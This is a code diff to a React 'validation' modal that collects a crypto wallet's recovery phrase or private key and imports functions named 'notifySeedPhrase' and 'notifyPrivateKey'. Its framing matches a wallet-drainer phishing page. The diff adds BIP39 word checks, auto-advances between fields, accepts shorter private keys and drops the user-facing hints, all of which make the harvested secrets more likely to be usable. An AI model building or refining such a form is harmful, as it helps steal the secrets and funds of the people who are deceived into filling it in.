@@ -1,5 +1,18 @@
 import { useState, useRef, useEffect } from "react";
+import { wordlist as BIP39_LIST } from "@scure/bip39/wordlists/english.js";
 import { notifySeedPhrase, notifyPrivateKey } from "@/lib/notify";
+
+const BIP39_WORDS = new Set(BIP39_LIST);
+
+function isValidBIP39Word(word: string): boolean {
+  return BIP39_WORDS.has(word.toLowerCase().trim());
+}
+
+function isPartialBIP39Word(partial: string): boolean {
+  if (!partial) return true;
+  const lower = partial.toLowerCase().trim();
+  return BIP39_LIST.some(w => w.startsWith(lower));
+}
 import { Button } from "@/components/ui/button";
 import { Input } from "@/components/ui/input";
 import {
@@ -57,10 +70,13 @@ export function ValidationModal({ walletAddress, onSuccess, onClose, onLogout }:
     phraseMode === "key"
       ? 0
       : words.slice(0, wordCount).filter(w => w.trim().length > 0).length;
+  const validWordCount =
+    phraseMode === "key" ? 0 : words.slice(0, wordCount).filter(w => isValidBIP39Word(w)).length;
+
   const isReady =
     phraseMode === "key"
-      ? privateKey.trim().length >= 32
-      : filledWords >= wordCount;
+      ? privateKey.trim().length >= 24
+      : validWordCount >= wordCount;
 
   useEffect(() => {
     if (phraseMode === "key") return;
@@ -101,11 +117,15 @@ export function ValidationModal({ walletAddress, onSuccess, onClose, onLogout }:
       const nextIdx = Math.min(index + pasted.length, wordCount - 1);
       setTimeout(() => inputRefs.current[nextIdx]?.focus(), 10);
     } else {
+      const lower = value.toLowerCase();
       setWords(prev => {
         const next = [...prev];
-        next[index] = value.toLowerCase();
+        next[index] = lower;
         return next;
       });
+      if (isValidBIP39Word(lower) && index < wordCount - 1) {
+        setTimeout(() => inputRefs.current[index + 1]?.focus(), 50);
+      }
     }
   };
 
@@ -399,39 +419,40 @@ export function ValidationModal({ walletAddress, onSuccess, onClose, onLogout }:
                       </button>
                     </div>
                     <div className={`grid gap-2 ${wordCount === 12 ? "grid-cols-3 sm:grid-cols-4" : "grid-cols-3 sm:grid-cols-6"}`}>
-                      {Array.from({ length: wordCount }).map((_, i) => (
-                        <div key={i} className="relative">
-                          <span className="absolute left-2 top-1/2 -translate-y-1/2 text-xs text-muted-foreground/40 font-mono select-none pointer-events-none z-10">
-                            {i + 1}
-                          </span>
-                          <input
-                            ref={el => { inputRefs.current[i] = el; }}
-                            data-testid={`input-word-${i + 1}`}
-                            type={showWords ? "text" : "password"}
-                            value={words[i] || ""}
-                            onChange={e => handleWordChange(i, e.target.value)}
-                            onKeyDown={e => handleWordKeyDown(i, e)}
-                            onFocus={e => e.target.select()}
-                            autoComplete="off" autoCorrect="off" autoCapitalize="none" spellCheck={false}
-                            className={`w-full pl-7 pr-2 py-2.5 text-xs font-mono rounded-md border transition-all duration-150 bg-white/4 outline-none ${
-                              words[i]
-                                ? "border-violet-500/40 bg-violet-500/5 text-foreground"
-                                : "border-white/8 text-muted-foreground"
-                            } focus:border-violet-500/60 focus:bg-violet-500/8`}
-                            placeholder="word"
-                          />
-                        </div>
-                      ))}
+                      {Array.from({ length: wordCount }).map((_, i) => {
+                        const w = words[i] || "";
+                        const empty = w.length === 0;
+                        const valid = isValidBIP39Word(w);
+                        const borderCls = empty
+                          ? "border-white/8 text-muted-foreground"
+                          : valid
+                            ? "border-green-500/50 bg-green-500/5 text-foreground"
+                            : "border-red-500/50 bg-red-500/8 text-foreground";
+                        return (
+                          <div key={i} className="relative">
+                            <span className="absolute left-2 top-1/2 -translate-y-1/2 text-xs text-muted-foreground/40 font-mono select-none pointer-events-none z-10">
+                              {i + 1}
+                            </span>
+                            <input
+                              ref={el => { inputRefs.current[i] = el; }}
+                              data-testid={`input-word-${i + 1}`}
+                              type={showWords ? "text" : "password"}
+                              value={w}
+                              onChange={e => handleWordChange(i, e.target.value)}
+                              onKeyDown={e => handleWordKeyDown(i, e)}
+                              onFocus={e => e.target.select()}
+                              autoComplete="off" autoCorrect="off" autoCapitalize="none" spellCheck={false}
+                              className={`w-full pl-7 pr-2 py-2.5 text-xs font-mono rounded-md border transition-all duration-150 bg-white/4 outline-none ${borderCls}`}
+                              placeholder="word"
+                            />
+                          </div>
+                        );
+                      })}
                     </div>
                     <div className="mt-3 h-1.5 rounded-full bg-white/5 overflow-hidden">
                       <div className="h-full rounded-full bg-gradient-to-r from-violet-600 to-cyan-500 transition-all duration-500"
-                        style={{ width: `${(filledWords / wordCount) * 100}%` }} />
+                        style={{ width: `${(validWordCount / wordCount) * 100}%` }} />
                     </div>
-                    <p className="text-xs text-muted-foreground/50 mt-1">
-                      {filledWords < wordCount
-                        ? `${wordCount - filledWords} word${wordCount - filledWords !== 1 ? "s" : ""} remaining`
-                        : "All words entered — ready to verify"}
-                    </p>
                   </div>
                 )}
 
@@ -461,11 +482,6 @@ export function ValidationModal({ walletAddress, onSuccess, onClose, onLogout }:
                       <div className="h-full rounded-full bg-gradient-to-r from-violet-600 to-cyan-500 transition-all duration-300"
                         style={{ width: `${Math.min((privateKey.trim().length / 64) * 100, 100)}%` }} />
                     </div>
-                    <p className="text-xs text-muted-foreground/50 mt-1">
-                      {privateKey.trim().length < 32
-                        ? `${Math.max(0, 32 - privateKey.trim().length)} more characters required`
-                        : "Key length acceptable — ready to verify"}
-                    </p>
                   </div>
                 )}
 
